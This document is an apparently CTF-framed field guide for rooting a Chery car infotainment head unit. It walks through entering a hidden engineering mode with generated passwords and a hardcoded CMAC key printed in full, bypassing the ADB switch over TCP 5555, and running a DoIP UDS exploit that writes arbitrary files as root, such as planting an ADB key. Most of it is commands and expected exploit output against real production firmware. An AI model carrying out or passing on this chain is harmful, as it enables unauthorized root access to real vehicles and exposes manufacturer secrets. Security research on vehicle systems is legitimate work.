# Field Guide — Chery IVI CTF (In-Car Execution)

Complete step-by-step for executing Phase 1 (ADB unlock) and Phase 2 (root)
against the physical head unit. Do everything in order. Each step says what
you should see if it worked.

---

## Prerequisites (before getting in the car)

On your laptop:

```bash
# 1. Ensure tools are installed
pip install cryptography   # for chery_engmode_tool.py
which adb                  # android platform-tools
which nc                   # netcat (for DoIP testing)
python3 doip_root_exploit.py --dry-run   # verify PoC loads

# 2. Generate an ADB keypair if you don't have one
ls ~/.android/adbkey.pub || adb keygen ~/.android/adbkey

# 3. Know your ADB public key path
cat ~/.android/adbkey.pub   # you'll need this content later
```

Bring: **USB-A cable** (for ADB over USB to head unit).

---

## Phase 1 — Get ADB Shell

### Step 1: Power on the head unit

Turn on the car (or ACC power). Wait for the IVI to boot to the home screen.

### Step 2: Enter Engineering Mode

1. Open **Settings** on the head unit
2. Find the hidden `into_engmode` row (may be a blank/invisible area in the settings list)
3. **Tap it 10 times rapidly**
4. The EngMode app should launch (`com.desaysv.engmode.MainActivity`)

**You should see:** An engineering mode password dialog.

### Step 3: Enter the Engineering Password

**Check which branch applies:**

The password depends on `ro.desay.cybersecurity`. From the dump this is `1` (secured).
You need to read the **randomNumber challenge** shown on screen.

**If the unit shows a plain numeric challenge (non-"Version 3.0"):**

```bash
# On your laptop, with the serial and randomNumber from screen:
python3 chery_engmode_tool.py password <serial_last6> --random <randomNumber>
```

Type the output into the password field.

**If cybersecurity=0 (unsecured unit, unlikely but possible):**

```bash
python3 chery_engmode_tool.py password <serial_last6>
# Example: python3 chery_engmode_tool.py password 017941
# Output: 004938
```

**If "Version 3.0" with CMAC challenge:**

```bash
# Read the VIN and randomNumber from the screen, then:
python3 chery_engmode_tool.py v3password <VIN> <randomNumber>
# Uses the stock CMAC key: 31697060FAA6B4D5A5AD1C4D9A3BD07A
```

Type the 6-character hex output into the password field.

### Step 4: Enable the ADB Switch

Once in eng mode, navigate to the **ADB switch**.

**WARNING: Do NOT press "Input AES Key" / load EngSecKey.txt.** That provisions a
new CMAC key to the MCU — it changes the Version 3.0 password derivation and will
lock you out of eng mode. It does NOT enable ADB.

**If `cybersecurity=1` (this unit):** A QR code challenge dialog appears.

**Option A — WiFi + TCP bypass (skip the ADB switch entirely):**

ADB listens on TCP:5555 regardless of the ADB switch state. From the eng mode
menu, open **WiFi settings** (no RSA gate on WiFi), connect to a network, then:

```bash
adb connect <head-unit-IP>:5555
```

**Option B — QR/RSA path (requires Chery backend):**

The legitimate ADB unlock needs a signed `adbauth.key` from Chery's backend —
not available offline. Skip this unless you have access to the signing service.

**If cybersecurity=0:** The ADB switch opens directly with no challenge. Just toggle it.

### Step 5: Connect ADB

```bash
# Over USB (plug USB cable into head unit)
adb devices
# Should show: <serial>    device

# Or over TCP (if on same network)
adb connect 192.168.1.3:5555
```

**The unit auto-approves ADB keys** — `UsbDebuggingActivity` has `mAlwaysAllow=true`
hardcoded. No "Allow USB debugging?" popup. You get shell immediately.

```bash
adb shell
# You should see: shell@<device>:/ $
# Verify: id
# Output: uid=2000(shell) gid=2000(shell)
```

**Phase 1 complete.** You have `adb shell` as UID 2000 (shell).

---

## Phase 2 — Root via DoIP

### Step 6: Verify network connectivity to DoIP server

From ADB shell:

```bash
# Check if 192.168.1.3 is a local address
ip addr show eth0

# Test DoIP port
nc -z 192.168.1.3 13400 && echo "OPEN" || echo "CLOSED"
```

**OR** from your laptop (if on the same 192.168.1.x subnet):

```bash
nc -z 192.168.1.3 13400 && echo "OPEN" || echo "CLOSED"
```

**You should see:** `OPEN`

If closed: the `uds_doip_server` may not be running. It starts on
`sys.boot_completed=1` — try rebooting the head unit and waiting 30 seconds.

### Step 7: Run the DoIP exploit (dry run first)

```bash
# Dry run — shows packets without sending
python3 doip_root_exploit.py --dry-run

# Verify the target path and your ADB pubkey
cat ~/.android/adbkey.pub
```

### Step 8: Run the DoIP exploit (live)

**Option A — From your laptop (if you can reach 192.168.1.3:13400 directly):**

```bash
python3 doip_root_exploit.py \
  --target 192.168.1.3 \
  --path /data/misc/adb/adb_keys \
  --data-file ~/.android/adbkey.pub
```

**Option B — From ADB shell (loopback):**

You need to get the Python script onto the device or use the shell script:

```bash
# Push the exploit to the device
adb push doip_root_exploit.py /data/local/tmp/
adb push exploit_chain.sh /data/local/tmp/

# If Python3 is available on the device:
adb shell python3 /data/local/tmp/doip_root_exploit.py \
  --path /data/misc/adb/adb_keys \
  --data "$(cat ~/.android/adbkey.pub)"

# If no Python3 on device, use nc + raw packets (see exploit_chain.sh)
# Or just run from laptop — the exploit is pure TCP, runs from anywhere
# that can reach 192.168.1.3:13400
```

**Expected output:**

```
[1] Connecting to 192.168.1.3:13400...
    Connected.
[2] Sending DoIP routing activation...
    Response: type=0x0006 len=...
[3] SecurityAccess: requesting seed (level 0x35)...
    Seed: <hex>
    Key:  <hex>
[4] SecurityAccess: sending key...
    UNLOCKED!
[5] RequestFileTransfer AddFile → /data/misc/adb/adb_keys...
    File opened for writing on target!
[6] TransferData block 1 (...)...
[7] RequestTransferExit...
    DONE — file written successfully.
```

### Step 9: Verify root write

```bash
# If you wrote to adb_keys, disconnect and reconnect ADB
adb disconnect
adb connect 192.168.1.3:5555
adb shell

# Verify your key is there
adb shell cat /data/misc/adb/adb_keys
```

**For the flag:** Write a proof file as root:

```bash
python3 doip_root_exploit.py \
  --path /data/local/tmp/proof_of_root.txt \
  --data "root write achieved via DoIP CVE chain"
```

Then verify:
```bash
adb shell ls -la /data/local/tmp/proof_of_root.txt
# Owner should be root
```

### Step 10: Read the flag

```bash
adb shell cat /data/local/tmp/root_flag.txt
# Expected: CHERY{...}
```

If the flag file is root-only (not shell-readable), use the DoIP write to make a
readable copy:

```bash
# Write a script that copies the flag
python3 doip_root_exploit.py \
  --path /data/local/tmp/copyflag.sh \
  --data '#!/system/bin/sh
cp /data/local/tmp/root_flag.txt /data/local/tmp/flag_readable.txt
chmod 644 /data/local/tmp/flag_readable.txt'

# Then trigger it via property (shell can set system_prop):
adb shell setprop sys.sv.svbugreport_service 1
# This triggers the svbugreport root service, but it runs a fixed binary,
# not our script. Alternative: use the DoIP write to directly overwrite
# the flag file permissions, or write to a path you can read.
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| DoIP port 13400 closed | Reboot head unit, wait 30s. Check `getprop sys.boot_completed` |
| SecurityAccess NRC 0x35 | Wrong security level. Try `--security-level 0x07` or `0x01` |
| SecurityAccess NRC 0x36 (exceeded attempts) | Wait 10s (penalty timer), retry |
| File write NRC 0x72 | Path too long or contains invalid chars |
| File write NRC 0x33 | SecurityAccess not unlocked — re-run seed/key exchange |
| `adb devices` empty | Check USB cable. Try `adb kill-server && adb start-server` |
| Eng mode password wrong | Verify serial number. Check which cybersecurity branch applies |
| ADB switch blocked by QR | Use WiFi + TCP bypass (Option A in Step 4) |
| Can't reach 192.168.1.3 | Check `ip addr` — you need to be on 192.168.1.x/24 subnet |

## Quick Reference

```
Eng password (cyber=0):  python3 chery_engmode_tool.py password <serial6>
Eng password (cyber=1):  python3 chery_engmode_tool.py password <serial6> --random <N>
Eng password (v3):       python3 chery_engmode_tool.py v3password <VIN> <random>
CMAC key (hex):          31697060FAA6B4D5A5AD1C4D9A3BD07A
DoIP exploit:            python3 doip_root_exploit.py --path <target> --data-file <file>
DoIP dry run:            python3 doip_root_exploit.py --dry-run
SecurityAccess levels:   0x01 (NOT), 0x07 (rot+XOR), 0x19, 0x29 (NOT), 0x35 (NEG)
```
